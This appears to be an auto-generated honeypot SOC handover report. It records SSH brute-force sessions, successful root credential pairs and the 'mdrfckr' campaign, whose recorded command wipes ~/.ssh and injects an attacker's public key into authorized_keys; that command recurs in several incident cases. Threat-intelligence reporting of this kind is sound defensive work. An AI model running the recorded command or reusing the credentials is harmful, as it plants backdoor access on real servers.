# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-03 |
| **Generated At** | 2026-05-03T22:50:03Z |
| **Shift Time** | 22:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **239** |
| Confirmed Threats | **225** |
| False Positives Filtered | **14** (5.9%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **18** |
| High Severity Cases | **100** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **139** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **218** |
| Unique Credential Pairs | **92** |
| Unique Usernames | **32** |
| Unique Passwords | **91** |
| Successful Auth Pairs | **54** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 100 |
| `345gs5662d34` | 50 |
| `test` | 7 |
| `ubuntu` | 6 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 50 |
| `3245gs5662d34` | 50 |
| `admin01` | 2 |
| `user123` | 2 |
| `qwertyroot` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 50 |
| `root` | `3245gs5662d34` | 50 |
| `root` | `admin01` | 2 |
| `user3` | `user123` | 2 |
| `test` | `qwertyroot` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin01` | `42.96.17.249` | 2026-05-03T20:52:56 |
| `root` | `3245gs5662d34` | `42.96.17.249` | 2026-05-03T20:52:59 |
| `root` | `sysadmin@123` | `42.96.17.249` | 2026-05-03T21:06:23 |
| `root` | `admin!@#321` | `42.96.17.249` | 2026-05-03T21:08:15 |
| `root` | `MoeClub.org` | `152.32.135.217` | 2026-05-03T21:09:03 |
| `root` | `3245gs5662d34` | `152.32.135.217` | 2026-05-03T21:09:06 |
| `root` | `admin2022` | `42.96.17.249` | 2026-05-03T21:09:59 |
| `root` | `asdfgg` | `152.32.135.217` | 2026-05-03T21:10:01 |
| `root` | `redhat@1` | `152.32.135.217` | 2026-05-03T21:10:56 |
| `root` | `Zq123456` | `152.32.135.217` | 2026-05-03T21:11:48 |
| `root` | `zz123456.` | `152.32.135.217` | 2026-05-03T21:13:38 |
| `root` | `Gd@ta2025` | `152.32.135.217` | 2026-05-03T21:15:25 |
| `root` | `vicidial@123` | `152.32.135.217` | 2026-05-03T21:16:18 |
| `root` | `adil` | `152.32.135.217` | 2026-05-03T21:17:11 |
| `root` | `Ga123456` | `152.32.135.217` | 2026-05-03T21:18:04 |
| `root` | `Hb123456@` | `152.32.135.217` | 2026-05-03T21:19:54 |
| `root` | `sysadmin@123` | `159.203.35.6` | 2026-05-03T21:19:56 |
| `root` | `3245gs5662d34` | `159.203.35.6` | 2026-05-03T21:20:02 |
| `root` | `test4321` | `152.32.135.217` | 2026-05-03T21:20:50 |
| `root` | `admin2022` | `159.203.35.6` | 2026-05-03T21:21:32 |
| `root` | `m` | `152.32.135.217` | 2026-05-03T21:21:47 |
| `root` | `1qazzaq1` | `152.32.135.217` | 2026-05-03T21:22:43 |
| `root` | `admin!@#321` | `159.203.35.6` | 2026-05-03T21:23:09 |
| `root` | `sd123456` | `152.32.135.217` | 2026-05-03T21:23:37 |
| `root` | `admin01` | `159.203.35.6` | 2026-05-03T21:23:55 |
| `root` | `Abc@123..` | `152.32.135.217` | 2026-05-03T21:25:24 |
| `root` | `bot` | `152.32.135.217` | 2026-05-03T21:26:19 |
| `root` | `Pas$word` | `152.32.135.217` | 2026-05-03T21:27:17 |
| `root` | `Mg123` | `152.32.135.217` | 2026-05-03T21:29:05 |
| `root` | `123322` | `152.32.135.217` | 2026-05-03T21:29:56 |
| `root` | `muhammad` | `152.32.135.217` | 2026-05-03T21:30:49 |
| `root` | `qazwsx12` | `152.32.135.217` | 2026-05-03T21:32:40 |
| `root` | `121` | `182.18.161.165` | 2026-05-03T22:20:31 |
| `root` | `3245gs5662d34` | `182.18.161.165` | 2026-05-03T22:20:32 |
| `root` | `zxcv123123` | `182.18.161.165` | 2026-05-03T22:21:18 |
| `root` | `password1!` | `182.18.161.165` | 2026-05-03T22:22:52 |
| `root` | `Server2025@` | `182.18.161.165` | 2026-05-03T22:23:38 |
| `root` | `@B0g0r123` | `182.18.161.165` | 2026-05-03T22:24:25 |
| `root` | `123456789qwertyuiop` | `182.18.161.165` | 2026-05-03T22:25:11 |
| `root` | `arcsight` | `182.18.161.165` | 2026-05-03T22:25:57 |
| `root` | `qwe123*` | `182.18.161.165` | 2026-05-03T22:26:41 |
| `root` | `Sa@123456789` | `182.18.161.165` | 2026-05-03T22:27:24 |
| `root` | `123456789!` | `182.18.161.165` | 2026-05-03T22:28:55 |
| `root` | `15975328` | `182.18.161.165` | 2026-05-03T22:29:41 |
| `root` | `1q@w3e4r5t6y` | `182.18.161.165` | 2026-05-03T22:31:12 |
| `root` | `Admin888` | `182.18.161.165` | 2026-05-03T22:34:14 |
| `root` | `P4ssw0rd123` | `182.18.161.165` | 2026-05-03T22:35:00 |
| `root` | `Ma@123456` | `182.18.161.165` | 2026-05-03T22:36:32 |
| `root` | `RootPassword` | `182.18.161.165` | 2026-05-03T22:38:05 |
| `root` | `India@2026` | `182.18.161.165` | 2026-05-03T22:38:53 |
| `root` | `bo@123456` | `182.18.161.165` | 2026-05-03T22:39:38 |
| `root` | `abc123456...` | `182.18.161.165` | 2026-05-03T22:41:06 |
| `root` | `sx@123456` | `182.18.161.165` | 2026-05-03T22:41:52 |
| `root` | `Server2025!` | `182.18.161.165` | 2026-05-03T22:43:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **239** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 220 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 181 | 3 |
| `03a80b21afa8...` | Modern SSH client | 39 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 181 | 3 | libssh-based |
| `03a80b21afa8...` | libssh | 39 | 3 | Modern SSH client |
| `95420f9d932d...` | Go SSH scanner | 3 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 50 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `42.96.17.249`, `159.203.35.6`, `182.18.161.165`, `152.32.135.217`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **21** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS18229` | CtrlS | 1 | HIGH |
| `AS264778` | TotalCom Venezuela C.A. | 1 | LOW |
| `AS28198` | SEMPRE TELECOMUNICACOES LTDA | 1 | LOW |
| `AS38841` | kbro CO. Ltd. | 1 | HIGH |
| `AS28458` | IENTC S DE RL DE CV | 1 | LOW |
| `AS50010` | Omani Qatari Telecommunication Company SAOC | 1 | LOW |
| `AS271951` | 4 EVER PLUG,C.A. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (100)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fd57c514d72f

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 20:52 |
| **Last Seen** | 2026-05-03 20:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:52:56` | `cowrie.session.connect` |
| `2026-05-03 20:52:56` | `cowrie.client.version` |
| `2026-05-03 20:52:56` | `cowrie.client.kex` |
| `2026-05-03 20:52:56` | `cowrie.login.success` |
| `2026-05-03 20:52:56` | `cowrie.session.params` |
| `2026-05-03 20:52:56` | `cowrie.command.input` |
| `2026-05-03 20:52:56` | `cowrie.command.failed` |
| `2026-05-03 20:52:57` | `cowrie.log.closed` |
| `2026-05-03 20:52:57` | `cowrie.session.params` |
| `2026-05-03 20:52:57` | `cowrie.command.input` |
| `2026-05-03 20:52:57` | `cowrie.session.file_download` |
| `2026-05-03 20:52:57` | `cowrie.log.closed` |
| `2026-05-03 20:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3824135831ed

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 20:52 |
| **Last Seen** | 2026-05-03 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:52:58` | `cowrie.session.connect` |
| `2026-05-03 20:52:58` | `cowrie.client.version` |
| `2026-05-03 20:52:59` | `cowrie.client.kex` |
| `2026-05-03 20:52:59` | `cowrie.login.success` |
| `2026-05-03 20:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba618b465bb

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:06 |
| **Last Seen** | 2026-05-03 21:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:06:22` | `cowrie.session.connect` |
| `2026-05-03 21:06:22` | `cowrie.client.version` |
| `2026-05-03 21:06:22` | `cowrie.client.kex` |
| `2026-05-03 21:06:23` | `cowrie.login.success` |
| `2026-05-03 21:06:23` | `cowrie.session.params` |
| `2026-05-03 21:06:23` | `cowrie.command.input` |
| `2026-05-03 21:06:23` | `cowrie.command.failed` |
| `2026-05-03 21:06:23` | `cowrie.log.closed` |
| `2026-05-03 21:06:23` | `cowrie.session.params` |
| `2026-05-03 21:06:23` | `cowrie.command.input` |
| `2026-05-03 21:06:23` | `cowrie.session.file_download` |
| `2026-05-03 21:06:23` | `cowrie.log.closed` |
| `2026-05-03 21:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac04e25a5f56

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:06 |
| **Last Seen** | 2026-05-03 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:06:25` | `cowrie.session.connect` |
| `2026-05-03 21:06:25` | `cowrie.client.version` |
| `2026-05-03 21:06:25` | `cowrie.client.kex` |
| `2026-05-03 21:06:25` | `cowrie.login.success` |
| `2026-05-03 21:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e63ace59ae9

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:08 |
| **Last Seen** | 2026-05-03 21:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:08:14` | `cowrie.session.connect` |
| `2026-05-03 21:08:14` | `cowrie.client.version` |
| `2026-05-03 21:08:14` | `cowrie.client.kex` |
| `2026-05-03 21:08:15` | `cowrie.login.success` |
| `2026-05-03 21:08:15` | `cowrie.session.params` |
| `2026-05-03 21:08:15` | `cowrie.command.input` |
| `2026-05-03 21:08:15` | `cowrie.command.failed` |
| `2026-05-03 21:08:15` | `cowrie.log.closed` |
| `2026-05-03 21:08:15` | `cowrie.session.params` |
| `2026-05-03 21:08:15` | `cowrie.command.input` |
| `2026-05-03 21:08:15` | `cowrie.session.file_download` |
| `2026-05-03 21:08:15` | `cowrie.log.closed` |
| `2026-05-03 21:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5cf4a2f7f79

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:08 |
| **Last Seen** | 2026-05-03 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:08:17` | `cowrie.session.connect` |
| `2026-05-03 21:08:17` | `cowrie.client.version` |
| `2026-05-03 21:08:17` | `cowrie.client.kex` |
| `2026-05-03 21:08:18` | `cowrie.login.success` |
| `2026-05-03 21:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c9640017caa

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:09 |
| **Last Seen** | 2026-05-03 21:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:09:03` | `cowrie.session.connect` |
| `2026-05-03 21:09:03` | `cowrie.client.version` |
| `2026-05-03 21:09:03` | `cowrie.client.kex` |
| `2026-05-03 21:09:03` | `cowrie.login.success` |
| `2026-05-03 21:09:04` | `cowrie.session.params` |
| `2026-05-03 21:09:04` | `cowrie.command.input` |
| `2026-05-03 21:09:04` | `cowrie.command.failed` |
| `2026-05-03 21:09:04` | `cowrie.log.closed` |
| `2026-05-03 21:09:04` | `cowrie.session.params` |
| `2026-05-03 21:09:04` | `cowrie.command.input` |
| `2026-05-03 21:09:04` | `cowrie.session.file_download` |
| `2026-05-03 21:09:04` | `cowrie.log.closed` |
| `2026-05-03 21:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18be456b7b88

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:09 |
| **Last Seen** | 2026-05-03 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:09:06` | `cowrie.session.connect` |
| `2026-05-03 21:09:06` | `cowrie.client.version` |
| `2026-05-03 21:09:06` | `cowrie.client.kex` |
| `2026-05-03 21:09:06` | `cowrie.login.success` |
| `2026-05-03 21:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a605b80a0b

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:09 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:09:58` | `cowrie.session.connect` |
| `2026-05-03 21:09:58` | `cowrie.client.version` |
| `2026-05-03 21:09:58` | `cowrie.client.kex` |
| `2026-05-03 21:09:59` | `cowrie.login.success` |
| `2026-05-03 21:09:59` | `cowrie.session.params` |
| `2026-05-03 21:09:59` | `cowrie.command.input` |
| `2026-05-03 21:09:59` | `cowrie.command.failed` |
| `2026-05-03 21:09:59` | `cowrie.log.closed` |
| `2026-05-03 21:09:59` | `cowrie.session.params` |
| `2026-05-03 21:09:59` | `cowrie.command.input` |
| `2026-05-03 21:09:59` | `cowrie.session.file_download` |
| `2026-05-03 21:09:59` | `cowrie.log.closed` |
| `2026-05-03 21:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04460a84e892

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:10 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:10:00` | `cowrie.session.connect` |
| `2026-05-03 21:10:00` | `cowrie.client.version` |
| `2026-05-03 21:10:00` | `cowrie.client.kex` |
| `2026-05-03 21:10:01` | `cowrie.login.success` |
| `2026-05-03 21:10:01` | `cowrie.session.params` |
| `2026-05-03 21:10:01` | `cowrie.command.input` |
| `2026-05-03 21:10:01` | `cowrie.command.failed` |
| `2026-05-03 21:10:01` | `cowrie.log.closed` |
| `2026-05-03 21:10:01` | `cowrie.session.params` |
| `2026-05-03 21:10:01` | `cowrie.command.input` |
| `2026-05-03 21:10:01` | `cowrie.session.file_download` |
| `2026-05-03 21:10:01` | `cowrie.log.closed` |
| `2026-05-03 21:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39af411ffcb0

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-03 21:10 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:10:01` | `cowrie.session.connect` |
| `2026-05-03 21:10:01` | `cowrie.client.version` |
| `2026-05-03 21:10:01` | `cowrie.client.kex` |
| `2026-05-03 21:10:01` | `cowrie.login.success` |
| `2026-05-03 21:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd743d90a80

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:10 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
